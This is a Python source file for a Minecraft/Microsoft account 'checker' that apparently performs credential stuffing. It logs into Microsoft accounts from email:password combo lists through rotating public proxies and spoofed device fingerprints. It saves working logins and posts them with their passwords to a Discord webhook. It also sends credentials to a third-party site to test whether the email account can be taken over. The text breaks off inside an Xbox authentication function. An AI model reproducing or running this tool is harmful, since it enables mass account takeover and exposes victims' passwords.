import os
import configparser
import requests
import time
import uuid
import json
import re
import concurrent.futures
import threading
import traceback
import random
import urllib3
import warnings
import sys
import socket
import socks
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
from datetime import datetime, timezone
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from io import StringIO
import hashlib
import platform

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Digital Fingerprint Generation
def generate_fingerprint():
    """Generate a unique digital fingerprint for this session"""
    fingerprint_data = {
        'session_id': str(uuid.uuid4()),
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'python_version': platform.python_version(),
        'processor': platform.processor(),
        'machine': platform.machine(),
        'node': platform.node(),
    }
    
    # Create a unique hash
    fingerprint_string = json.dumps(fingerprint_data, sort_keys=True)
    fingerprint_hash = hashlib.sha256(fingerprint_string.encode()).hexdigest()[:16]
    
    fingerprint_data['fingerprint_id'] = fingerprint_hash
    return fingerprint_data

# Generate global fingerprint
DIGITAL_FINGERPRINT = generate_fingerprint()
SESSION_ID = DIGITAL_FINGERPRINT['fingerprint_id']

# Device fingerprint rotation - generates new fingerprint per account check
def generate_device_fingerprint():
    """Generate a unique device fingerprint for each account check"""
    device_data = {
        'device_id': str(uuid.uuid4()),
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'screen_resolution': f"{random.randint(1366, 3840)}x{random.randint(768, 2160)}",
        'user_agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]),
        'accept_language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-US,en;q=0.9,fr;q=0.8']),
        'timezone': random.choice(['America/New_York', 'Europe/London', 'Asia/Tokyo', 'Australia/Sydney', 'America/Los_Angeles']),
        'platform': random.choice(['Windows', 'macOS', 'Linux']),
        'color_depth': random.choice([24, 32]),
        'pixel_ratio': random.choice([1, 1.5, 2])
    }
    
    device_string = json.dumps(device_data, sort_keys=True)
    device_hash = hashlib.sha256(device_string.encode()).hexdigest()[:16]
    device_data['device_fingerprint'] = device_hash
    
    return device_data

# Add fingerprint to all requests via session
class FingerprintedSession(requests.Session):
    def __init__(self, device_fingerprint=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.device_fingerprint = device_fingerprint or generate_device_fingerprint()
        self.headers.update({
            'X-Session-ID': SESSION_ID,
            'X-Fingerprint': DIGITAL_FINGERPRINT['fingerprint_id'],
            'X-Device-ID': self.device_fingerprint.get('device_id', str(uuid.uuid4())),
            'X-Device-Fingerprint': self.device_fingerprint.get('device_fingerprint', ''),
            'X-Session-Timestamp': DIGITAL_FINGERPRINT['timestamp'],
            'User-Agent': self.device_fingerprint.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"),
            'Accept-Language': self.device_fingerprint.get('accept_language', 'en-US,en;q=0.9'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })

proxylist = []
proxy_last_update = 0
PROXY_UPDATE_INTERVAL = 1800  # 30 minutes in seconds
banproxies = []
proxytype = "'4'"  # Default to proxyless

# Proxy sources from GitHub
PROXY_SOURCES = {
    'http': [
        'https://github.com/SoliSpirit/proxy-list/raw/refs/heads/main/http.txt',
        'https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/http.txt'
    ],
    'https': [
        'https://github.com/SoliSpirit/proxy-list/raw/refs/heads/main/https.txt',
        'https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/https.txt'
    ],
    'socks4': [
        'https://github.com/SoliSpirit/proxy-list/raw/refs/heads/main/socks4.txt',
        'https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks4.txt'
    ],
    'socks5': [
        'https://github.com/SoliSpirit/proxy-list/raw/refs/heads/main/socks5.txt',
        'https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt'
    ]
}

# Login constants from DonutChkr
CLIENT_ID = "00000000402b5328"
SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id={}&response_type=token&redirect_uri={}&scope={}&display=touch&locale=en".format(
    CLIENT_ID, REDIRECT_URI, SCOPE
)

# Statistics
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
fname = ""
proxy_lock = threading.Lock()

def log_exception(exc_type, exc_value, exc_tb):
    with open("logs.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"[Fingerprint: {SESSION_ID}] ")
        traceback.print_exception(exc_type, exc_value, exc_tb, file=log_file)

sys.excepthook = log_exception

if hasattr(threading, "excepthook"):
    def thread_excepthook(args):
        log_exception(args.exc_type, args.exc_value, args.exc_traceback)
    threading.excepthook = thread_excepthook

RESULTS_DIR = "results"

def ensure_results_folder(combo_file):
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
    folder_name = os.path.splitext(os.path.basename(combo_file))[0] if combo_file else "combined_results"
    folder_path = os.path.join(RESULTS_DIR, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    # Save fingerprint info in results folder
    fingerprint_file = os.path.join(folder_path, "fingerprint.txt")
    with open(fingerprint_file, "w", encoding="utf-8") as f:
        f.write(f"Session ID: {SESSION_ID}\n")
        f.write(f"Fingerprint: {json.dumps(DIGITAL_FINGERPRINT, indent=2)}\n")
        f.write(f"Started: {DIGITAL_FINGERPRINT['timestamp']}\n")
    
    return folder_path

def save_result(folder, filename, line):
    # Add fingerprint to each saved result
    with open(os.path.join(folder, filename), "a", encoding="utf-8") as f:
        f.write(f"[Fingerprint: {SESSION_ID}] {line}\n")

def update_proxies_from_github():
    """Update proxy list from GitHub sources"""
    global proxylist, proxy_last_update
    
    current_time = time.time()
    if proxy_last_update and (current_time - proxy_last_update) < PROXY_UPDATE_INTERVAL:
        return  # Don't update if less than 30 minutes have passed
    
    print(Fore.YELLOW + "[PROXY] Updating proxies from GitHub sources..." + Style.RESET_ALL)
    
    new_proxies = []
    proxy_type_map = {
        'http': 'http',
        'https': 'http',
        'socks4': 'socks4',
        'socks5': 'socks5'
    }
    
    with proxy_lock:
        for proxy_type, urls in PROXY_SOURCES.items():
            for url in urls:
                try:
                    response = requests.get(url, timeout=15)
                    if response.status_code == 200:
                        proxies = response.text.splitlines()
                        for proxy in proxies:
                            proxy = proxy.strip()
                            if proxy and not proxy.startswith('#'):
                                # Format proxy based on type
                                if proxy_type in ['http', 'https']:
                                    if not proxy.startswith('http://') and not proxy.startswith('https://'):
                                        proxy = f"http://{proxy}"
                                elif proxy_type == 'socks4':
                                    if not proxy.startswith('socks4://'):
                                        proxy = f"socks4://{proxy}"
                                elif proxy_type == 'socks5':
                                    if not proxy.startswith('socks5://'):
                                        proxy = f"socks5://{proxy}"
                                new_proxies.append(proxy)
                        print(Fore.GREEN + f"[PROXY] Loaded {len(proxies)} {proxy_type} proxies from {url}" + Style.RESET_ALL)
                        break  # Success, break out of URL loop
                except Exception as e:
                    print(Fore.RED + f"[PROXY] Failed to load from {url}: {e}" + Style.RESET_ALL)
                    continue
        
        if new_proxies:
            proxylist = list(set(new_proxies))  # Remove duplicates
            proxy_last_update = current_time
            print(Fore.GREEN + f"[PROXY] Total proxies: {len(proxylist)}" + Style.RESET_ALL)
            save_proxy_list()
        else:
            print(Fore.RED + "[PROXY] Failed to load any proxies. Using existing list." + Style.RESET_ALL)

def save_proxy_list():
    """Save current proxy list to file for backup"""
    try:
        with open("proxies_backup.txt", "w", encoding="utf-8") as f:
            for proxy in proxylist:
                f.write(proxy + "\n")
    except:
        pass

def load_proxy_backup():
    """Load proxy list from backup file"""
    global proxylist
    if os.path.exists("proxies_backup.txt"):
        try:
            with open("proxies_backup.txt", "r", encoding="utf-8") as f:
                proxylist = [line.strip() for line in f if line.strip()]
            print(Fore.CYAN + f"[PROXY] Loaded {len(proxylist)} proxies from backup." + Style.RESET_ALL)
            return True
        except:
            pass
    return False

def getproxy():
    """Get a random proxy from the list, updating if needed"""
    global proxy_last_update
    
    # Check if we need to update proxies
    current_time = time.time()
    if proxytype == "'5'" and (not proxylist or (current_time - proxy_last_update) > PROXY_UPDATE_INTERVAL):
        update_proxies_from_github()
    
    if len(proxylist) == 0:
        return None
    
    with proxy_lock:
        proxy = random.choice(proxylist)
    
    # Return proxy in format that requests can use
    if proxytype == "'5'" or proxytype == "'1'":  # HTTP/HTTPS
        if proxy.startswith('http://') or proxy.startswith('https://'):
            return {'http': proxy, 'https': proxy.replace('http://', 'https://')}
        else:
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
    elif proxytype == "'2'":  # SOCKS4
        if proxy.startswith('socks4://'):
            return {'http': proxy, 'https': proxy}
        else:
            return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
    elif proxytype == "'3'":  # SOCKS5
        if proxy.startswith('socks5://'):
            return {'http': proxy, 'https': proxy}
        else:
            return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
    else:
        return None

def load_config():
    config_path = "config.ini"
    config = configparser.ConfigParser()
    default_settings = {
        "Threads": "10",
        "Max Retries": "5",
        "SaveCapture": "True",
        "Webhook": "",
        "WebhookMessage": """@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>
Session ID: <sessionid>""",
        "Proxyless Ban Check": "False",
        "Auto Scrape Minutes": "5",
        "WebhookImage": "https://cdn.discordapp.com/avatars/1032944901412880394/c36d4305e39429697d9625d541a27e82.png?size=4096",
        "WebhookThumbnail": "https://cdn.discordapp.com/avatars/1032944901412880394/c36d4305e39429697d9625d541a27e82.png?size=4096",
        "ProxyUpdateInterval": "30"
    }
    
    # Capture settings
    default_captures = {
        "Hypixel Name": "True",
        "Hypixel Level": "True",
        "First Hypixel Login": "True",
        "Last Hypixel Login": "True",
        "Optifine Cape": "True",
        "Minecraft Capes": "True",
        "Email Access": "True",
        "Hypixel Skyblock Coins": "True",
        "Hypixel Bedwars Stars": "True",
        "Hypixel Ban": "True",
        "Name Change Availability": "True",
        "Last Name Change": "True"
    }
    
    if not os.path.isfile(config_path):
        config["Settings"] = default_settings
        config["Captures"] = default_captures
        with open(config_path, "w") as f:
            config.write(f)
    
    config.read(config_path)
    
    # Ensure all sections exist
    if "Settings" not in config:
        config["Settings"] = default_settings
    if "Captures" not in config:
        config["Captures"] = default_captures
    
    # Fill missing values
    for key, value in default_settings.items():
        if key not in config["Settings"]:
            config["Settings"][key] = value
    
    for key, value in default_captures.items():
        if key not in config["Captures"]:
            config["Captures"][key] = value
    
    with open(config_path, "w") as f:
        config.write(f)
    
    return config

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config_obj = Config()

def str_to_bool(value):
    return str(value).lower() in ('yes', 'true', 't', '1', '1.0')

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, mc_name="", mc_uuid="", mc_token="", ban_status="", ban_reason="", time_left="", ban_id=""):
        self.email = email
        self.password = password
        self.name = name  # Original Minecraft name from main.py logic
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.mc_name = mc_name  # DonutSMP specific
        self.mc_uuid = mc_uuid  # DonutSMP specific
        self.mc_token = mc_token  # DonutSMP specific
        self.ban_status = ban_status  # DonutSMP specific
        self.ban_reason = ban_reason  # DonutSMP specific
        self.time_left = time_left  # DonutSMP specific
        self.ban_id = ban_id  # DonutSMP specific
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None
        self.device_fingerprint = None

    def builder(self):
        message = f"Session ID: {SESSION_ID}\nEmail: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        
        # DonutSMP specific info
        if self.mc_name:
            message += f"\nDonutSMP Name: {self.mc_name}"
        if self.ban_status:
            message += f"\nDonutSMP Ban Status: {self.ban_status}"
        if self.ban_reason:
            message += f"\nDonutSMP Ban Reason: {self.ban_reason}"
        if self.time_left:
            message += f"\nDonutSMP Time Left: {self.time_left}"
        if self.ban_id:
            message += f"\nDonutSMP Ban ID: {self.ban_id}"
        
        # Original captures
        if self.hypixl is not None: 
            message += f"\nHypixel: {self.hypixl}"
        if self.level is not None: 
            message += f"\nHypixel Level: {self.level}"
        if self.firstlogin is not None: 
            message += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin is not None: 
            message += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape is not None: 
            message += f"\nOptifine Cape: {self.cape}"
        if self.access is not None: 
            message += f"\nEmail Access: {self.access}"
        if self.sbcoins is not None: 
            message += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars is not None: 
            message += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config_obj.get('hypixelban') is True: 
            message += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: 
            message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: 
            message += f"\nLast Name Change: {self.lastchanged}"
        
        return message + "\n============================\n"

    def notify(self):
        global errors
        try:
            webhook = config_obj.get('webhook')
            message = config_obj.get('message')
            webhook_image = config_obj.get('webhook_image', "https://cdn.discordapp.com/avatars/1032944901412880394/c36d4305e39429697d9625d541a27e82.png?size=4096")
            webhook_thumbnail = config_obj.get('webhook_thumbnail', "https://cdn.discordapp.com/avatars/1032944901412880394/c36d4305e39429697d9625d541a27e82.png?size=4096")
            
            if not webhook or not message:
                return
            
            # Determine color based on account type
            color = 0x00FF00  # Green for normal
            if "Ultimate" in str(self.type):
                color = 0xFFD700  # Gold for Ultimate
            elif "Game Pass" in str(self.type):
                color = 0x1E90FF  # Blue for Game Pass
            elif "Banned" in str(self.type):
                color = 0xFF0000  # Red for banned
            elif "DonutSMP" in str(self.type):
                color = 0x9B59B6  # Purple for DonutSMP
            
            # Build the embed
            embed = {
                "title": f"🎮 Account Hit - {self.name or 'N/A'}",
                "description": message
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A")
                    .replace("<donutsmp_name>", self.mc_name or "N/A")
                    .replace("<donutsmp_ban_status>", self.ban_status or "N/A")
                    .replace("<donutsmp_ban_reason>", self.ban_reason or "N/A")
                    .replace("<donutsmp_time_left>", self.time_left or "N/A")
                    .replace("<donutsmp_ban_id>", self.ban_id or "N/A")
                    .replace("<sessionid>", SESSION_ID),
                "color": color,
                "thumbnail": {
                    "url": webhook_thumbnail
                },
                "image": {
                    "url": webhook_image
                },
                "footer": {
                    "text": f"Session: {SESSION_ID} | Device: {self.device_fingerprint.get('device_fingerprint', 'N/A') if self.device_fingerprint else 'N/A'}",
                    "icon_url": webhook_image
                },
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "fields": [
                    {
                        "name": "📧 Email",
                        "value": f"||{self.email}||",
                        "inline": True
                    },
                    {
                        "name": "🔑 Password",
                        "value": f"||{self.password}||",
                        "inline": True
                    },
                    {
                        "name": "👤 Name",
                        "value": self.name or "N/A",
                        "inline": True
                    },
                    {
                        "name": "🏷️ Type",
                        "value": self.type or "N/A",
                        "inline": True
                    },
                    {
                        "name": "🕹️ Session ID",
                        "value": SESSION_ID,
                        "inline": False
                    }
                ]
            }
            
            # Add Hypixel fields if available
            if self.hypixl:
                embed["fields"].append({
                    "name": "🪐 Hypixel",
                    "value": self.hypixl,
                    "inline": True
                })
            if self.level:
                embed["fields"].append({
                    "name": "📊 Hypixel Level",
                    "value": self.level,
                    "inline": True
                })
            if self.bwstars:
                embed["fields"].append({
                    "name": "⭐ Bedwars Stars",
                    "value": self.bwstars,
                    "inline": True
                })
            if self.sbcoins:
                embed["fields"].append({
                    "name": "💰 Skyblock Coins",
                    "value": self.sbcoins,
                    "inline": True
                })
            if self.banned:
                embed["fields"].append({
                    "name": "🚫 Ban Status",
                    "value": self.banned,
                    "inline": False
                })
            
            # Add DonutSMP fields if available
            if self.mc_name:
                embed["fields"].append({
                    "name": "🍩 DonutSMP Name",
                    "value": self.mc_name,
                    "inline": True
                })
            if self.ban_status:
                embed["fields"].append({
                    "name": "🍩 DonutSMP Status",
                    "value": self.ban_status,
                    "inline": True
                })
            if self.ban_reason:
                embed["fields"].append({
                    "name": "🍩 DonutSMP Reason",
                    "value": self.ban_reason,
                    "inline": False
                })
            if self.time_left:
                embed["fields"].append({
                    "name": "⏰ Time Left",
                    "value": self.time_left,
                    "inline": True
                })
            
            # Add cape info
            if self.capes:
                embed["fields"].append({
                    "name": "🎭 MC Capes",
                    "value": self.capes,
                    "inline": True
                })
            if self.cape:
                embed["fields"].append({
                    "name": "🖼️ Optifine Cape",
                    "value": self.cape,
                    "inline": True
                })
            
            # Add access info
            if self.access:
                embed["fields"].append({
                    "name": "🔓 Email Access",
                    "value": self.access,
                    "inline": True
                })
            
            payload = {
                "embeds": [embed],
                "username": f"DONUTSMP-CHECKER [{SESSION_ID[:8]}]",
                "avatar_url": webhook_image,
                "content": "@everyone" if "Ultimate" in str(self.type) or "Game Pass" in str(self.type) else None
            }
            
            # Remove any None content
            if payload["content"] is None:
                del payload["content"]
            
            requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except Exception as e:
            print(Fore.RED + f"Webhook error: {e}" + Style.RESET_ALL)
            pass

    def hypixel(self):
        global errors
        try:
            if config_obj.get('hypixelname') is True or config_obj.get('hypixellevel') is True or config_obj.get('hypixelfirstlogin') is True or config_obj.get('hypixellastlogin') is True or config_obj.get('hypixelbwstars') is True:
                device_fp = generate_device_fingerprint()
                session = FingerprintedSession(device_fp)
                if getproxy():
                    session.proxies = getproxy()
                tx = session.get('https://plancke.io/hypixel/player/stats/'+self.name, verify=False).text
                try: 
                    if config_obj.get('hypixelname') is True: 
                        self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixellevel') is True: 
                        self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixelfirstlogin') is True: 
                        self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixellastlogin') is True: 
                        self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixelbwstars') is True: 
                        self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config_obj.get('hypixelsbcoins') is True:
                try:
                    device_fp = generate_device_fingerprint()
                    session = FingerprintedSession(device_fp)
                    if getproxy():
                        session.proxies = getproxy()
                    req = session.get("https://sky.shiiyu.moe/stats/"+self.name, verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: 
            errors += 1

    def optifine(self):
        if config_obj.get('optifinecape') is True:
            try:
                device_fp = generate_device_fingerprint()
                session = FingerprintedSession(device_fp)
                if getproxy():
                    session.proxies = getproxy()
                txt = session.get(f'http://s.optifine.net/capes/{self.name}.png', verify=False).text
                if "Not found" in txt: 
                    self.cape = "No"
                else: 
                    self.cape = "Yes"
            except: 
                self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config_obj.get('access') is True:
            try:
                device_fp = generate_device_fingerprint()
                session = FingerprintedSession(device_fp)
                out = json.loads(session.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out.get("Success") == 1: 
                    self.access = "True"
                    mfa += 1
                    save_result(f"results/{fname}", "MFA.txt", f"{self.email}:{self.password}")
                else:
                    sfa += 1
                    self.access = "False"
                    save_result(f"results/{fname}", "SFA.txt", f"{self.email}:{self.password}")
            except: 
                self.access = "Unknown"
    
    def namechange(self):
        if config_obj.get('namechange') is True or config_obj.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    device_fp = generate_device_fingerprint()
                    session = FingerprintedSession(device_fp)
                    if getproxy():
                        session.proxies = getproxy()
                    check = session.get('https://api.minecraftservices.com/minecraft/profile/namechange', 
                                        headers={'Authorization': f'Bearer {self.token}'}, verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config_obj.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config_obj.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: 
                            pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: 
                            time.sleep(20)
                        self.namechange()
                except: 
                    pass
                tries += 1
                retries += 1
    
    def ban(self):
        global errors
        if config_obj.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned is None:
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], 
                                                   port=int(atsplit[1].split(':')[1]), 
                                                   username=atsplit[0].split(':')[0], 
                                                   password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned is None and c < 1000:
                            time.sleep(.01)
                            c += 1
                        connection.disconnect()
                    except: 
                        pass
                    sys.stderr = original_stderr
                except: 
                    pass
                
                if self.banned is not None: 
                    break
                tries += 1

    def handle(self):
        global hits
        hits += 1
        if screen == "'2'": 
            print(Fore.GREEN + f"Hit: {self.name} | {self.email}:{self.password} | Session: {SESSION_ID}")
        
        save_result(f"results/{fname}", "Hits.txt", f"{self.email}:{self.password}")
        
        if self.name != 'N/A':
            try: 
                self.hypixel()
            except: 
                pass
            try: 
                self.optifine()
            except: 
                pass
            try: 
                self.full_access()
            except: 
                pass
            try: 
                self.namechange()
            except: 
                pass
            try: 
                self.ban()
            except: 
                pass
        
        save_result(f"results/{fname}", "Capture.txt", self.builder())
        self.notify()

# DONUTSMP SPECIFIC FUNCTIONS (from DonutChkr.py)
def get_urlPost_sFTTag(session):
    for _ in range(5):
        try:
            text = session.get(OAUTH_URL, timeout=15).text
            match = re.search(r'value=\\?"(.+?)\\?"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag, session
        except Exception:
            pass
        time.sleep(1)
    raise Exception("Failed to get urlPost or sFTTag")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    for _ in range(5):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != OAUTH_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
                    pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
                    uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    recovery_data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                    recovery_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(recovery_url, data=recovery_data, allow_redirects=True)
                    fin_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(fin_url, allow_redirects=True)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, session
                except:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                return "None", session
        except Exception:
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        time.sleep(1)
    return None, session

def xbox_authenticate(ms_access_token):
    device_fp = generate_device_fingerprint()
    session = FingerprintedSession(device_fp)
    url = "https://user.auth.xboxlive.com/user/authenticate"
    payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_access_token
        },
